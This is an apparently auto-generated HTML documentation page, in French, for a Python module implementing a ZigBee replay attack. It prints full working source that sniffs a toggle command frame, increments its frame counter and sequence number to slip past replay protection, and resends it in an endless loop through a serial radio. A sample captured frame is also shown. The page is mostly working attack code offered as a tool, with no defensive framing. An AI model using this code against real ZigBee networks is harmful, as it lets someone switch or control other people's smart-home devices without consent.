<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
<meta name="generator" content="pdoc3 0.11.5">
<title>scripts.replay API documentation</title>
<meta name="description" content="Module : zigbee_replay_attack
…">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/sanitize.min.css" integrity="sha512-y1dtMcuvtTMJc1yPgEqF0ZjQbhnc/bFhyvIyVNb9Zk5mIGtqVaAB1Ttl28su8AvFMOY0EwRbAe+HCLqj6W7/KA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/typography.min.css" integrity="sha512-Y1DYSb995BAfxobCkKepB1BqJJTPrOp3zPL74AWFugHHmmdcvO+C48WLrUOlhGMc0QG7AE3f7gmvvcrmX2fDoA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:1.5em;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:2em 0 .50em 0}h3{font-size:1.4em;margin:1.6em 0 .7em 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .2s ease-in-out}a:visited{color:#503}a:hover{color:#b62}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900;font-weight:bold}pre code{font-size:.8em;line-height:1.4em;padding:1em;display:block}code{background:#f3f3f3;font-family:"DejaVu Sans Mono",monospace;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source > summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible;min-width:max-content}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em 1em;margin:1em 0}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul ul{padding-left:1em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" integrity="sha512-D9gUyxqja7hBtkWpPWGt9wfbfaMGVt9gnyCvYa+jojwwPHLCzUm5i8rpk7vD7wNee9bA35eYIjobYPaQuKS1MQ==" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => {
hljs.configure({languages: ['bash', 'css', 'diff', 'graphql', 'ini', 'javascript', 'json', 'plaintext', 'python', 'python-repl', 'rust', 'shell', 'sql', 'typescript', 'xml', 'yaml']});
hljs.highlightAll();
/* Collapse source docstrings */
setTimeout(() => {
[...document.querySelectorAll('.hljs.language-python > .hljs-string')]
.filter(el => el.innerHTML.length > 200 && ['"""', "'''"].includes(el.innerHTML.substring(0, 3)))
.forEach(el => {
let d = document.createElement('details');
d.classList.add('hljs-string');
d.innerHTML = '<summary>"""</summary>' + el.innerHTML.substring(3);
el.replaceWith(d);
});
}, 100);
})</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>scripts.replay</code></h1>
</header>
<section id="section-intro">
<h1 id="module-zigbee_replay_attack">Module : zigbee_replay_attack</h1>
<p>Ce module implémente une attaque de replay sur le réseau ZigBee.</p>
<p>Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee.
Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.</p>
<h2 id="classes">Classes</h2>
<p>ZigbeeReplayAttack: Classe principale pour effectuer l'attaque de replay.</p>
<p>Exemple d'utilisation:
&gt;&gt;&gt; from zigbee_replay_attack import ZigbeeReplayAttack
&gt;&gt;&gt; attaque = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0', aes_key='ma_cle_aes')
&gt;&gt;&gt; attaque.lancer_attaque_replay(capture_live=True)</p>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="scripts.replay.ZigbeeReplayAttack"><code class="flex name class">
<span>class <span class="ident">ZigbeeReplayAttack</span></span>
<span>(</span><span>capture_file: str = 'captures_zigbee.json',<br>channel: int = 13,<br>pan_id: int = 6400,<br>serial_port: str | None = None,<br>aes_key: str | None = None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class ZigbeeReplayAttack:
    &#34;&#34;&#34;
    Classe pour effectuer une attaque de replay sur le réseau ZigBee.

    Cette classe permet de :
        - Capturer des trames ZigBee en direct ou depuis un fichier.
        - Analyser et filtrer les trames capturées.
        - Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
        - Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.

    Attributs:
        capture_file (str): Nom du fichier de capture des trames (par défaut &#39;captures_zigbee.json&#39;).
        channel (int): Canal ZigBee utilisé pour l&#39;attaque (par défaut 13).
        pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
        serial_port (Optional[str]): Port série pour l&#39;envoi des trames.
        aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
        codeur (CodeurTrameZigbee): Instance de l&#39;encodeur de trame ZigBee.
        decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
        sniffer (SniffeurZigbee): Instance pour la capture des trames.
        framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
        captures (list): Liste des trames capturées.
        replay_queue (queue.Queue): File d&#39;attente pour la gestion des trames à rejouer.
    &#34;&#34;&#34;

    def __init__(
        self, 
        capture_file: str = &#39;captures_zigbee.json&#39;, 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None
    ):
        &#34;&#34;&#34;
        Initialise l&#39;attaque de replay ZigBee.

        Paramètres:
            capture_file (str): Nom du fichier de capture (par défaut &#39;captures_zigbee.json&#39;).
            channel (int): Canal ZigBee (par défaut 13).
            pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
            serial_port (Optional[str]): Port série pour l&#39;envoi des trames.
            aes_key (Optional[str]): Clé AES pour la sécurité des trames, si applicable.
        &#34;&#34;&#34;
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200
        )
        self.framefinder = ZigbeeFrameFinder()
        self.captures = []
        self.replay_queue = queue.Queue()

    def attendre_trame_data(self, timeout: int = 30) -&gt; Optional[str]:
        &#34;&#34;&#34;
        Capture en direct une trame ZigBee de type Data correspondant au toggle.

        La fonction démarre le sniffer et attend qu&#39;une trame de type &#39;Data&#39;
        provenant du cluster 0600 avec un command_id égal à &#39;02&#39; et une longueur de trame inférieure à 100
        soit capturée. Une fois la trame correspondante trouvée, elle est décodée et renvoyée.

        Paramètres:
            timeout (int): Durée maximale d&#39;attente en secondes (par défaut 30).

        Retourne:
            Optional[str]: La trame ZigBee capturée sous forme de chaîne hexadécimale, ou None si aucune trame n&#39;est trouvée.
        &#34;&#34;&#34;
        self.sniffer.reinitialiser() 
        logger.info(&#34;Attente d&#39;une trame Toggle...&#34;)
        self.sniffer.demarrer_sniffer()
        
        start_time = time.time()
        while time.time() - start_time &lt; timeout:
            if self.sniffer.captures:
                for capture in self.sniffer.captures:
                    try:
                        # Filtrage de la trame selon le type, le cluster, le command_id et la taille
                        if (capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and
                            capture.get(&#39;couche_aps&#39;, {}).get(&#39;cluster_id&#39;, &#39;&#39;).lower() == &#39;0600&#39; and
                            capture.get(&#39;couche_zcl&#39;, {}).get(&#39;command_id&#39;, &#39;&#39;).lower() == &#39;02&#39;) and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 100:
                            
                            hex_data = capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]
                            
                            # Décodage de la trame pour affichage (facultatif)
                            decode = DecodeurTrameZigbee()
                            octets = bytes.fromhex(hex_data)
                            print(decode.decoder_trame_data(octets))
                            
                            logger.info(&#34;Trame Toggle détectée&#34;)
                            
                            self.sniffer.arreter_sniffer()
                            self.sniffer.reinitialiser()
                            return hex_data
                        else:
                            # Afficher la trame si elle n&#39;est pas conforme aux critères et la supprimer
                            if capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 95:
                                print(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;])
                            self.sniffer.captures.remove(capture)
                    except KeyError:
                        continue
            time.sleep(0.1)
            
        self.sniffer.arreter_sniffer()
        logger.error(&#34;Timeout: Aucune trame Toggle trouvée&#34;)
        return None

    def envoyer_trames_en_boucle(self):
        &#34;&#34;&#34;
        Envoie en boucle des trames de replay sur le réseau ZigBee.

        La fonction récupère d&#39;abord une trame initiale (en attente d&#39;une trame Toggle)
        puis, en utilisant la classe ZigbeeFrameFinder, elle incrémente le compteur de trame
        et le numéro de séquence avant de réenvoyer la trame modifiée sur le port série.

        Remarque:
            La trame initiale est tronquée de ses 4 derniers octets avant d&#39;être traitée.
        &#34;&#34;&#34;
        trame_initiale = self.attendre_trame_data() #&#34;6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202&#34;#
        if not trame_initiale:
            return
        
        # Suppression des 4 derniers octets de la trame initiale
        trame_initiale = trame_initiale[:-4]
        print(&#34;Trame initiale : &#34;, trame_initiale)
        
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f&#34;Début de l&#39;envoi sur {self.serial_port}&#34;)
                
                # Modification de la trame en incrémentant le compteur de trame
                trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
                print(&#34;Trame modifiée : &#34;, trame_modifiee)
                trame_bytes = bytes.fromhex(trame_modifiee)

                # Envoi en boucle de la trame modifiée
                while True:
                    try:
                        # Préfixe de trame (&#39;61&#39;) ajouté à la trame modifiée
                        ser.write(bytes.fromhex(&#39;61&#39;) + trame_bytes)
                        logger.debug(f&#34;Trame envoyée : {trame_bytes.hex()}&#34;)
                        time.sleep(3) 
                        print(&#34;Trame envoyée : &#34;, trame_bytes.hex())
                        
                        # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
                        trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
                        trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)

                        trame_bytes = bytes.fromhex(trame_modifiee)
                        print(&#34;Trame modifiée (extrait compteur) : &#34;, trame_bytes.hex()[-8:-6])
                        
                    except Exception as e:
                        logger.error(f&#34;Erreur d&#39;envoi : {e}&#34;)
                        break
        except serial.SerialException as e:
            logger.error(f&#34;Erreur port série : {e}&#34;)

    def lancer_attaque_replay(self, capture_live: bool = True):
        &#34;&#34;&#34;
        Lance l&#39;attaque de replay sur le réseau ZigBee.

        Selon le paramètre capture_live, la fonction capture en direct les trames ou
        utilise un fichier de capture existant. Elle démarre ensuite un thread qui
        exécute l&#39;envoi en boucle des trames de replay.

        Paramètres:
            capture_live (bool): Si True, la capture en direct est activée; sinon, le fichier de capture est utilisé. Par défaut True.

        Exceptions:
            Toute exception survenue lors de l&#39;exécution de l&#39;attaque est logguée.
        &#34;&#34;&#34;
        try:
            if capture_live:
                logger.info(&#34;Mode capture live activé&#34;)
            else:
                with open(self.capture_file, &#39;r&#39;) as f:
                    self.captures = json.load(f)

            thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
            thread_replay.start()
            thread_replay.join()

        except Exception as e:
            logger.error(f&#34;Échec de l&#39;attaque : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Classe pour effectuer une attaque de replay sur le réseau ZigBee.</p>
<p>Cette classe permet de :
- Capturer des trames ZigBee en direct ou depuis un fichier.
- Analyser et filtrer les trames capturées.
- Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
- Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.</p>
<h2 id="attributs">Attributs</h2>
<p>capture_file (str): Nom du fichier de capture des trames (par défaut 'captures_zigbee.json').
channel (int): Canal ZigBee utilisé pour l'attaque (par défaut 13).
pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
serial_port (Optional[str]): Port série pour l'envoi des trames.
aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
codeur (CodeurTrameZigbee): Instance de l'encodeur de trame ZigBee.
decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
sniffer (SniffeurZigbee): Instance pour la capture des trames.
framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
captures (list): Liste des trames capturées.
replay_queue (queue.Queue): File d'attente pour la gestion des trames à rejouer.</p>
<p>Initialise l'attaque de replay ZigBee.</p>
<h2 id="parametres">Paramètres</h2>
<p>capture_file (str): Nom du fichier de capture (par défaut 'captures_zigbee.json').
channel (int): Canal ZigBee (par défaut 13).
pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
serial_port (Optional[str]): Port série pour l'envoi des trames.
aes_key (Optional[str]): Clé AES pour la sécurité des trames, si applicable.</p></div>
<h3>Methods</h3>
<dl>
<dt id="scripts.replay.ZigbeeReplayAttack.attendre_trame_data"><code class="name flex">
<span>def <span class="ident">attendre_trame_data</span></span>(<span>self, timeout: int = 30) ‑> str | None</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attendre_trame_data(self, timeout: int = 30) -&gt; Optional[str]:
    &#34;&#34;&#34;
    Capture en direct une trame ZigBee de type Data correspondant au toggle.

    La fonction démarre le sniffer et attend qu&#39;une trame de type &#39;Data&#39;
    provenant du cluster 0600 avec un command_id égal à &#39;02&#39; et une longueur de trame inférieure à 100
    soit capturée. Une fois la trame correspondante trouvée, elle est décodée et renvoyée.

    Paramètres:
        timeout (int): Durée maximale d&#39;attente en secondes (par défaut 30).

    Retourne:
        Optional[str]: La trame ZigBee capturée sous forme de chaîne hexadécimale, ou None si aucune trame n&#39;est trouvée.
    &#34;&#34;&#34;
    self.sniffer.reinitialiser() 
    logger.info(&#34;Attente d&#39;une trame Toggle...&#34;)
    self.sniffer.demarrer_sniffer()
    
    start_time = time.time()
    while time.time() - start_time &lt; timeout:
        if self.sniffer.captures:
            for capture in self.sniffer.captures:
                try:
                    # Filtrage de la trame selon le type, le cluster, le command_id et la taille
                    if (capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and
                        capture.get(&#39;couche_aps&#39;, {}).get(&#39;cluster_id&#39;, &#39;&#39;).lower() == &#39;0600&#39; and
                        capture.get(&#39;couche_zcl&#39;, {}).get(&#39;command_id&#39;, &#39;&#39;).lower() == &#39;02&#39;) and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 100:
                        
                        hex_data = capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]
                        
                        # Décodage de la trame pour affichage (facultatif)
                        decode = DecodeurTrameZigbee()
                        octets = bytes.fromhex(hex_data)
                        print(decode.decoder_trame_data(octets))
                        
                        logger.info(&#34;Trame Toggle détectée&#34;)
                        
                        self.sniffer.arreter_sniffer()
                        self.sniffer.reinitialiser()
                        return hex_data
                    else:
                        # Afficher la trame si elle n&#39;est pas conforme aux critères et la supprimer
                        if capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 95:
                            print(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;])
                        self.sniffer.captures.remove(capture)
                except KeyError:
                    continue
        time.sleep(0.1)
        
    self.sniffer.arreter_sniffer()
    logger.error(&#34;Timeout: Aucune trame Toggle trouvée&#34;)
    return None</code></pre>
</details>
<div class="desc"><p>Capture en direct une trame ZigBee de type Data correspondant au toggle.</p>
<p>La fonction démarre le sniffer et attend qu'une trame de type 'Data'
provenant du cluster 0600 avec un command_id égal à '02' et une longueur de trame inférieure à 100
soit capturée. Une fois la trame correspondante trouvée, elle est décodée et renvoyée.</p>
<h2 id="parametres">Paramètres</h2>
<p>timeout (int): Durée maximale d'attente en secondes (par défaut 30).</p>
<h2 id="retourne">Retourne</h2>
<p>Optional[str]: La trame ZigBee capturée sous forme de chaîne hexadécimale, ou None si aucune trame n'est trouvée.</p></div>
</dd>
<dt id="scripts.replay.ZigbeeReplayAttack.envoyer_trames_en_boucle"><code class="name flex">
<span>def <span class="ident">envoyer_trames_en_boucle</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def envoyer_trames_en_boucle(self):
    &#34;&#34;&#34;
    Envoie en boucle des trames de replay sur le réseau ZigBee.

    La fonction récupère d&#39;abord une trame initiale (en attente d&#39;une trame Toggle)
    puis, en utilisant la classe ZigbeeFrameFinder, elle incrémente le compteur de trame
    et le numéro de séquence avant de réenvoyer la trame modifiée sur le port série.

    Remarque:
        La trame initiale est tronquée de ses 4 derniers octets avant d&#39;être traitée.
    &#34;&#34;&#34;
    trame_initiale = self.attendre_trame_data() #&#34;6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202&#34;#
    if not trame_initiale:
        return
    
    # Suppression des 4 derniers octets de la trame initiale
    trame_initiale = trame_initiale[:-4]
    print(&#34;Trame initiale : &#34;, trame_initiale)
    
    try:
        with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
            logger.info(f&#34;Début de l&#39;envoi sur {self.serial_port}&#34;)
            
            # Modification de la trame en incrémentant le compteur de trame
            trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
            print(&#34;Trame modifiée : &#34;, trame_modifiee)
            trame_bytes = bytes.fromhex(trame_modifiee)

            # Envoi en boucle de la trame modifiée
            while True:
                try:
                    # Préfixe de trame (&#39;61&#39;) ajouté à la trame modifiée
                    ser.write(bytes.fromhex(&#39;61&#39;) + trame_bytes)
                    logger.debug(f&#34;Trame envoyée : {trame_bytes.hex()}&#34;)
                    time.sleep(3) 
                    print(&#34;Trame envoyée : &#34;, trame_bytes.hex())
                    
                    # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
                    trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
                    trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)

                    trame_bytes = bytes.fromhex(trame_modifiee)
                    print(&#34;Trame modifiée (extrait compteur) : &#34;, trame_bytes.hex()[-8:-6])
                    
                except Exception as e:
                    logger.error(f&#34;Erreur d&#39;envoi : {e}&#34;)
                    break
    except serial.SerialException as e:
        logger.error(f&#34;Erreur port série : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Envoie en boucle des trames de replay sur le réseau ZigBee.</p>
<p>La fonction récupère d'abord une trame initiale (en attente d'une trame Toggle)
puis, en utilisant la classe ZigbeeFrameFinder, elle incrémente le compteur de trame
et le numéro de séquence avant de réenvoyer la trame modifiée sur le port série.</p>
<h2 id="remarque">Remarque</h2>
<p>La trame initiale est tronquée de ses 4 derniers octets avant d'être traitée.</p></div>
</dd>
<dt id="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay"><code class="name flex">
<span>def <span class="ident">lancer_attaque_replay</span></span>(<span>self, capture_live: bool = True)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def lancer_attaque_replay(self, capture_live: bool = True):
    &#34;&#34;&#34;
    Lance l&#39;attaque de replay sur le réseau ZigBee.

    Selon le paramètre capture_live, la fonction capture en direct les trames ou
    utilise un fichier de capture existant. Elle démarre ensuite un thread qui
    exécute l&#39;envoi en boucle des trames de replay.

    Paramètres:
        capture_live (bool): Si True, la capture en direct est activée; sinon, le fichier de capture est utilisé. Par défaut True.

    Exceptions:
        Toute exception survenue lors de l&#39;exécution de l&#39;attaque est logguée.
    &#34;&#34;&#34;
    try:
        if capture_live:
            logger.info(&#34;Mode capture live activé&#34;)
        else:
            with open(self.capture_file, &#39;r&#39;) as f:
                self.captures = json.load(f)

        thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
        thread_replay.start()
        thread_replay.join()

    except Exception as e:
        logger.error(f&#34;Échec de l&#39;attaque : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Lance l'attaque de replay sur le réseau ZigBee.</p>
<p>Selon le paramètre capture_live, la fonction capture en direct les trames ou
utilise un fichier de capture existant. Elle démarre ensuite un thread qui
exécute l'envoi en boucle des trames de replay.</p>
<h2 id="parametres">Paramètres</h2>
<p>capture_live (bool): Si True, la capture en direct est activée; sinon, le fichier de capture est utilisé. Par défaut True.</p>
<h2 id="exceptions">Exceptions</h2>
<p>Toute exception survenue lors de l'exécution de l'attaque est logguée.</p></div>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<div class="toc">
<ul>
<li><a href="#module-zigbee_replay_attack">Module : zigbee_replay_attack</a></li>
</ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="scripts" href="index.html">scripts</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="scripts.replay.ZigbeeReplayAttack" href="#scripts.replay.ZigbeeReplayAttack">ZigbeeReplayAttack</a></code></h4>
<ul class="">
<li><code><a title="scripts.replay.ZigbeeReplayAttack.attendre_trame_data" href="#scripts.replay.ZigbeeReplayAttack.attendre_trame_data">attendre_trame_data</a></code></li>
<li><code><a title="scripts.replay.ZigbeeReplayAttack.envoyer_trames_en_boucle" href="#scripts.replay.ZigbeeReplayAttack.envoyer_trames_en_boucle">envoyer_trames_en_boucle</a></code></li>
<li><code><a title="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay" href="#scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay">lancer_attaque_replay</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.11.5</a>.</p>
</footer>
</body>
</html>
